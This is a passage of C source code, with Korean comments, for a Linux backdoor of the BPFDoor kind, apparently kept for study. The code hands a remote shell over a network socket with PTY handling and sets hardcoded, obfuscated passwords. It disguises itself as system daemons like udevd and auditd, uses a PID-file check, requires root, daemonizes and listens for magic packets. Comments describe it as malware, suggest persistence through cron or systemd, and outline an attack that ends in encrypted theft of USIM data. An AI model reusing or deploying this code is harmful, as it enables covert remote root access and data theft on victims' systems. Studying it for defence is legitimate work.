            0x2f, 0x62, 0x69, 0x6e, 0x00}; // PATH=/bin:/usr/kerberos/sbin:/usr/kerberos/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin:./bin
        char term[] = "vt100";

        envp[0] = home;
        envp[1] = ps;
        envp[2] = histfile;
        envp[3] = mshist;
        envp[4] = ipath;
        envp[5] = term;
        envp[6] = NULL;

        if (rcmd != NULL)
                system(rcmd);
        if (dcmd != NULL)
                system(dcmd);
        write(sock, "3458", 4);
        if (!open_tty())
        {
                if (!fork())
                {
                        dup2(sock, 0);
                        dup2(sock, 1);
                        dup2(sock, 2);
                        execve(sh, argvv, envp);
                }
                close(sock);
                return 0;
        }

        subshell = fork();
        if (subshell == 0)
        {
                close(pty);
                ioctl(tty, TIOCSCTTY);
                close(sock);
                dup2(tty, 0);
                dup2(tty, 1);
                dup2(tty, 2);
                close(tty);
                execve(sh, argvv, envp);
        }
        close(tty);

        while (1)
        {
                FD_ZERO(&fds);
                FD_SET(pty, &fds);
                FD_SET(sock, &fds);
                if (select((pty > sock) ? (pty + 1) : (sock + 1),
                           &fds, NULL, NULL, NULL) < 0)
                {
                        break;
                }
                if (FD_ISSET(pty, &fds))
                {
                        int count;
                        count = read(pty, buf, BUF);
                        if (count <= 0)
                                break;
                        if (cwrite(sock, buf, count) <= 0)
                                break;
                }
                if (FD_ISSET(sock, &fds))
                {
                        int count;
                        unsigned char *p, *d;
                        d = (unsigned char *)buf;
                        count = cread(sock, buf, BUF);
                        if (count <= 0)
                                break;

                        p = memchr(buf, ECHAR, count);
                        if (p)
                        {
                                unsigned char wb[5];
                                int rlen = count - ((long)p - (long)buf);
                                struct winsize ws;

                                if (rlen > 5)
                                        rlen = 5;
                                memcpy(wb, p, rlen);
                                if (rlen < 5)
                                {
                                        ret = cread(sock, &wb[rlen], 5 - rlen);
                                }

                                ws.ws_xpixel = ws.ws_ypixel = 0;
                                ws.ws_col = (wb[1] << 8) + wb[2];
                                ws.ws_row = (wb[3] << 8) + wb[4];
                                ioctl(pty, TIOCSWINSZ, &ws);
                                kill(0, SIGWINCH);

                                ret = write(pty, buf, (long)p - (long)buf);
                                rlen = ((long)buf + count) - ((long)p + 5);
                                if (rlen > 0)
                                        ret = write(pty, p + 5, rlen);
                        }
                        else if (write(pty, d, count) <= 0)
                                break;
                }
        }
        close(sock);
        close(pty);
        waitpid(subshell, NULL, 0);
        vhangup();
        exit(0);
}

/*
 * 메인 함수
 * 멀웨어의 초기화 및 실행을 담당합니다.
 *
 * 주요 단계:
 * 1. 암호 및 프로세스 위장 이름 설정
 * 2. PID 파일 확인(이미 실행 중인지 확인)
 * 3. 사용자 권한 확인(루트 권한 필요)
 * 4. 프로세스 자체를 메모리에 복사 및 초기화
 * 5. 프로세스 이름 위장
 * 6. 데몬화(백그라운드로 실행)
 * 7. 패킷 루프 시작하여 매직 패킷 모니터링
 */
int main(int argc, char *argv[])
{
        char hash[] = {0x6a, 0x75, 0x73, 0x74, 0x66, 0x6f, 0x72, 0x66, 0x75, 0x6e, 0x00}; // justforfun
        char hash2[] = {0x73, 0x6f, 0x63, 0x6b, 0x65, 0x74, 0x00};                        // socket
        char *self[] = {
            "/sbin/udevd -d",
            "/sbin/mingetty /dev/tty7",
            "/usr/sbin/console-kit-daemon --no-daemon",
            "hald-addon-acpi: listening on acpi kernel interface /proc/acpi/event",
            "dbus-daemon --system",
            "hald-runner",
            "pickup -l -t fifo -u",
            "avahi-daemon: chroot helper",
            "/sbin/auditd -n",
            "/usr/lib/systemd/systemd-journald"};

        pid_path[0] = 0x2f;
        pid_path[1] = 0x76;
        pid_path[2] = 0x61;
        pid_path[3] = 0x72;
        pid_path[4] = 0x2f;
        pid_path[5] = 0x72;
        pid_path[6] = 0x75;
        pid_path[7] = 0x6e;
        pid_path[8] = 0x2f;
        pid_path[9] = 0x68;
        pid_path[10] = 0x61;
        pid_path[11] = 0x6c;
        pid_path[12] = 0x64;
        pid_path[13] = 0x72;
        pid_path[14] = 0x75;
        pid_path[15] = 0x6e;
        pid_path[16] = 0x64;
        pid_path[17] = 0x2e;
        pid_path[18] = 0x70;
        pid_path[19] = 0x69;
        pid_path[20] = 0x64;
        pid_path[21] = 0x00; // /var/run/haldrund.pid

        if (access(pid_path, R_OK) == 0)
        {
                exit(0);
        }

        if (getuid() != 0)
        {
                return 0;
        }

        if (argc == 1)
        {
                if (to_open(argv[0], "kdmtmpflush") == 0)
                        _exit(0);
                _exit(-1);
        }

        bzero(&cfg, sizeof(cfg));

        srand((unsigned)time(NULL));
        strcpy(cfg.mask, self[rand() % 10]);
        strcpy(cfg.pass, hash);
        strcpy(cfg.pass2, hash2);

        setup_time(argv[0]);

        set_proc_name(argc, argv, cfg.mask);

        if (fork())
                exit(0); // 부모 프로세스를 종료 (데몬화, 백그라운드 실행)
        init_signal();
        signal(SIGCHLD, sig_child);
        godpid = getpid();

        // PID 파일 생성 -> 실행 중임을 뜻함
        // 재부팅시에는 삭제가 되니까 cron, systemd 등에 등록해서 재부팅시에도 실행되도록 해야함
        close(open(pid_path, O_CREAT | O_WRONLY, 0644)); 

        signal(SIGCHLD, SIG_IGN);
        setsid(); // 새로운 세션 생성
        packet_loop();
        return 0;
}

/**
 * 공격의 순서
 * 1. 백도어 설치 + 루트 권한 실행
 * 2. 매직 패킷을 쏴서 쉘 명령을 쏘는 거
 * 3. 루트 권한으로 데이터들 마음껏 조회
 * 4. 유심 데이터를 찾아냈을 것
 * 5. RC4 알고리즘으로 암호화
 * 6. 공격자는 암호화된 통신을 바탕으로 데이터 받아온 상태
 */